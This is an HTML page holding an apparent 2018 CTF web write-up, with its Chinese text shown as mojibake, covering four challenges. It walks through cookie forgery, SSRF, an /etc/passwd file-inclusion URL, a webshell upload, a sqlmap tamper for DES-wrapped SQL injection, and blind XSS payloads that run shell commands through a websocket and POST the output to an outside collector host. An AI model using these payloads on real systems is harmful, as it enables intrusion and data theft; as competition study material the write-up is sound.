<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB writeup - sn00py</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=ç”Ÿæ´»,åšå®¢,å‰ç«¯,æ¸¸æˆ>
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  
    <link rel="alternate" href="/atom.xml " title="sn00py" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/style.css">
</head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">sn00py</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">ä¸»é¡µ</a>
        </li>
      
        <li class="menu-item">
          <a href="/archives" class="menu-item-link">å½’æ¡£</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">å…³äº</a>
        </li>
      
        <li class="menu-item">
          <a href="/friends/" class="menu-item-link">Frinds</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB writeup</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2018-05-13</span>
  </div>
  <div class="post-content">
    <h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h1><p><a href="http://117.34.117.216/" target="_blank" rel="noopener">http://117.34.117.216/</a></p>
<p>éšä¾¿æ³¨å†Œä¸ªè´¦å·,ç„¶åç™»é™†,</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/8.jpg" alt=""></p>
<p>è®¾ç½®cookieçš„æ—¶å€™æ˜¯æŠŠç”¨æˆ·åè¿›è¡Œbase64ç¼–ç ,æŠŠè¿™é‡Œæ”¹æˆadminçš„base64ç¼–ç .</p>
<p>ç™»å½•åå³ä¸Šè§’æœ‰ä¸ªä¿®æ”¹å¯†ç çš„é“¾æ¥,</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/9.jpg" alt=""></p>
<p>é‡ç½®adminçš„å¯†ç åå†ç™»é™†.</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/10.jpg" alt=""></p>
<p>åœ¨è¿œç¨‹å›¾ç‰‡åœ°å€å†™å…¥<a href="http://127.0.0.1/flag.php,å¯ä»¥è¯»å–åˆ°flag" target="_blank" rel="noopener">http://127.0.0.1/flag.php,å¯ä»¥è¯»å–åˆ°flag</a>.</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/11.jpg" alt=""></p>
<h1 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h1><p>å­˜åœ¨æ–‡ä»¶åŒ…å«å’ŒGITæ³„éœ².</p>
<p><a href="http://117.34.116.192/index.php?file=/etc/passwd" target="_blank" rel="noopener">http://117.34.116.192/index.php?file=/etc/passwd</a></p>
<p><a href="http://117.34.116.192/.git" target="_blank" rel="noopener">http://117.34.116.192/.git</a></p>
<p>åˆ©ç”¨GITæ³„éœ²æ‹¿åˆ°æºç ,å…¶ä¸­upload.phpèƒ½ä¸Šä¼ æ–‡ä»¶.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Administrator</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'in_adminid'</span>]) || <span class="keyword">empty</span>($_COOKIE[<span class="string">'in_adminexpire'</span>]) || $_COOKIE[<span class="string">'in_adminexpire'</span>]!==md5($_COOKIE[<span class="string">'in_adminid'</span>].$_COOKIE[<span class="string">'in_adminname'</span>].$_COOKIE[<span class="string">'in_adminpassword'</span>].$_COOKIE[<span class="string">'in_permission'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        setcookie(<span class="string">"in_adminexpire"</span>,$_COOKIE[<span class="string">'in_adminexpire'</span>],time()+<span class="number">1800</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_COOKIE[<span class="string">'in_permission'</span>]))&#123;</span><br><span class="line">            $array=explode(<span class="string">","</span>,$_COOKIE[<span class="string">'in_permission'</span>]);</span><br><span class="line">            $adminlogined=<span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($array);$i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>($array[$i]==$value)&#123;$adminlogined=<span class="keyword">true</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!$adminlogined)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Administrator(<span class="number">2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>]))&#123;</span><br><span class="line">            $filename = <span class="string">'./img/img'</span>.rand().<span class="string">'.jpg'</span>;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],$filename);</span><br><span class="line">            header(<span class="string">'Refresh:3,url=index.php?file=upload.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload $filename Success!"</span>;</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">'Refresh:3,url=index.php?file=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Who are you!"</span>;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>COOKIEçš„æ„é€ å¾ˆç®€å•,å…ˆä¸Šä¼ ä¸ªä¸€å¥è¯,</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/7.jpg" alt=""></p>
<p>ç„¶ååŒ…å«å³å¯.</p>
<p>æ‹¿åˆ°çš„flagå‘ç°ç»è¿‡äº†PM9SCREWåŠ å¯†,æ‰¾ä¸ªä»˜è´¹çš„è§£å¯†ç½‘ç«™å°±èƒ½è§£.</p>
<h1 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h1><p><a href="http://45.76.49.10:8001/" target="_blank" rel="noopener">http://45.76.49.10:8001/</a></p>
<p>ç›´æ¥ç”¨pcç«¯çš„æµè§ˆå™¨ä¼šè·³è½¬åˆ°QQç©ºé—´,æƒ³åˆ°ä¸ä¹…å‰å…ˆçŸ¥çš„ä¸€ç¯‡æ–‡ç« :</p>
<p><a href="https://xz.aliyun.com/t/2322" target="_blank" rel="noopener">https://xz.aliyun.com/t/2322</a></p>
<p>æŠ“åŒ…å‘ç°äº†2ä¸ªè¯·æ±‚,é¦–å…ˆåŠ è½½ä¸€ä¸ªJS.</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/2.jpg" alt=""></p>
<p>è·å–åˆ°çš„JSåŠ å¯†äº†.</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/3.jpg" alt=""></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="built_in">decodeURIComponent</span>(arcfour(<span class="string">"36a9dc5d29d54b46793d0c682298dbab"</span>,base64_decode(<span class="string">"..."</span>))))</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå…ˆå¯¹å¯†æ–‡è¿›è¡Œbase64è§£ç =&gt;RC4è§£å¯†=&gt;URLè§£ç ,ç„¶å†™å…¥å½“å‰é¡µé¢.åªéœ€è¦ç®€å•åšä¸‹ä¿®æ”¹å°±èƒ½æ‹¿åˆ°æ˜æ–‡äº†.</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/4.jpg" alt=""></p>
<p>æ‰¾åˆ°å…¶ä¸­å‘é€è´¦å·å¯†ç çš„è¯·æ±‚,</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!err)&#123;</span><br><span class="line">	$.ajax(&#123;</span><br><span class="line">		url:<span class="string">'/f701fee85540b78d08cb276d14953d58'</span>,</span><br><span class="line">		type:<span class="string">'POST'</span>,</span><br><span class="line">		dataType:<span class="string">'json'</span>,</span><br><span class="line">		data: <span class="string">"data="</span>+<span class="built_in">encodeURIComponent</span>(encryptByDES($(<span class="string">'#loginform'</span>).serialize(),key)),</span><br><span class="line">		error:<span class="function"><span class="keyword">function</span>(<span class="params">er</span>)</span>&#123;</span><br><span class="line">		    <span class="built_in">window</span>.location.href=<span class="string">'https://qzone.qq.com'</span>;</span><br><span class="line">              &#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘é€çš„æ•°æ®ä¼šå…ˆDESåŠ å¯†,è¾“å‡ºæ˜æ–‡å’Œå¯†é’¥çœ‹ä¸‹.</p>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/5.jpg" alt=""></p>
<p>æµ‹è¯•åå‘ç°å¯†ç å­—æ®µå­˜åœ¨æ³¨å…¥,ç”¨PHPå†™ä¸ªä¸­è½¬è„šæœ¬.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">'pwd'</span>];</span><br><span class="line">$p = <span class="string">"ip=&#123;$ip&#125;&amp;hrUW3PG7mp3RLd3dJu=&#123;$name&#125;&amp;LxMzAX2jog9Bpjs07jP=&#123;$pwd&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">des_encrypt</span><span class="params">($str, $key)</span> </span>&#123;</span><br><span class="line">  $block = mcrypt_get_block_size(<span class="string">'des'</span>, <span class="string">'ecb'</span>);</span><br><span class="line">  $pad = $block - (strlen($str) % $block);</span><br><span class="line">  $str .= str_repeat(chr($pad), $pad);</span><br><span class="line">  <span class="keyword">return</span> mcrypt_encrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);</span><br><span class="line">&#125;</span><br><span class="line">$c = urlencode(base64_encode(des_encrypt($p,<span class="string">"MiaoMiao"</span>)));</span><br><span class="line">$post = <span class="string">"data="</span>.$c;</span><br><span class="line"><span class="comment">//$post = ['data' =&gt; $c,];   è¿™æ ·å†™æ˜¯content-typeæ˜¯ä¸Šä¼ æ–‡ä»¶çš„!!è¢«å‘äº†å¥½ä¹…</span></span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"http://45.76.49.10:8001/f701fee85540b78d08cb276d14953d58"</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">'X-Requested-With: XMLHttpRequest'</span>,));</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $post);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$ch_out = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…å†™ä¸ªsqlmapçš„tamper,</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_enc</span><span class="params">(key, str)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> str</span><br><span class="line">    k = des(key, ECB, pad=<span class="keyword">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">    encrypt_str = k.encrypt(str)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(encrypt_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    p = <span class="string">"ip=1&amp;hrUW3PG7mp3RLd3dJu=1&amp;LxMzAX2jog9Bpjs07jP=%s"</span> % payload</span><br><span class="line">    enc_data = des_enc(bytes(<span class="string">"MiaoMiao"</span>), bytes(p))</span><br><span class="line">    <span class="keyword">return</span> enc_data</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/6.jpg" alt=""></p>
<h1 id="WEB4"><a href="#WEB4" class="headerlink" title="WEB4"></a>WEB4</h1><p><img src="/2018/05/13/ç¬¬å››å±Šå…¨å›½ç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WEB-writeup/1.jpg" alt=""></p>
<p>ä¸€ä¸ªæ²¡è¿‡æ»¤çš„XSSç›²æ‰“,å¹¶ä¸”ç»™äº†ä¸€æ®µä»£ç æç¤º.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">type msg struct &#123;</span><br><span class="line">	Cmd string <span class="string">`json:"cmd"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    app := sweetygo.New(<span class="string">"./"</span>, nil)</span><br><span class="line">    app.GET(<span class="string">"/ws"</span>, ws)</span><br><span class="line">    app.RunServer(<span class="string">":8002"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func ws(ctx *sweetygo.Context) &#123;</span><br><span class="line">	conn, <span class="attr">_</span> := websocket.Upgrade(ctx.Resp, ctx.Req, ctx.Resp.Header(), <span class="number">1024</span>, <span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		m := msg&#123;&#125;</span><br><span class="line">		err := conn.ReadJSON(&amp;m)</span><br><span class="line">		<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">			fmt.Println(<span class="string">"Error reading json."</span>, err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		res := exec(m.Cmd)</span><br><span class="line">		fmt.Println(res)</span><br><span class="line">		<span class="keyword">if</span> err = conn.WriteJSON(res); err != nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹ä¸Šå»æ˜¯åœ¨8002ç«¯å£å¯äº†ä¸€ä¸ªwebsocket server,å¹¶ä¸”å­˜åœ¨å‘½ä»¤æ‰§è¡Œ.</p>
<p>æ‰€ä»¥æ€è·¯å°±æ˜¯åˆ©ç”¨XSSå»è¯·æ±‚websocketæ¥æ‰§è¡Œå‘½ä»¤.</p>
<p>å¦å¤–,å¦‚æœå»è¯»æ•´ä¸ªdomçš„è¯,å¯ä»¥çœ‹åˆ°å…¶å®ƒäººæ’å…¥çš„XSS,è¿™æ ·å°±èƒ½çœ‹åˆ°å¤§ä½¬çš„payloadäº†ğŸ˜</p>
<p>payload(1):</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">	<span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">"ws://127.0.0.1:8002/ws"</span>);</span><br><span class="line">	socket.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		socket.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">cmd</span>:<span class="string">"ls"</span>&#125;)) </span><br><span class="line">	&#125;;</span><br><span class="line">	socket.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		$.ajax(</span><br><span class="line">		&#123;</span><br><span class="line">			type: <span class="string">"POST"</span>,</span><br><span class="line">			url: <span class="string">"//ip:1027/"</span>,</span><br><span class="line">			data: <span class="built_in">JSON</span>.parse(e.data),</span><br><span class="line">			dataType: <span class="string">"JSON"</span> 	</span><br><span class="line">		&#125;</span><br><span class="line">			); </span><br><span class="line">	&#125;; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload(2):</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">	<span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">"ws://127.0.0.1:8002/ws"</span>);</span><br><span class="line">	socket.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		socket.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="attr">cmd</span>:<span class="string">"cat flaaaaag.txt"</span>&#125;)) </span><br><span class="line">	&#125;;</span><br><span class="line">	socket.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; 	</span><br><span class="line">		$.ajax(</span><br><span class="line">		&#123;</span><br><span class="line">			type: <span class="string">"POST"</span>,</span><br><span class="line">			url: <span class="string">"//ip:1028/"</span>,</span><br><span class="line">			data: <span class="built_in">JSON</span>.parse(e.data),</span><br><span class="line">			dataType: <span class="string">"JSON"</span> 	</span><br><span class="line">		&#125;</span><br><span class="line">			); </span><br><span class="line">	&#125;; </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
  </div>
  <div class="post-footer">
    

    <a href="#top" class="top">è¿”å›é¡¶éƒ¨</a>
  </div>
</article>
<footer>
  &copy; 2018
  <span class="author">
    sn00py
  </span>
</footer>
    </div>
  </body>
</html>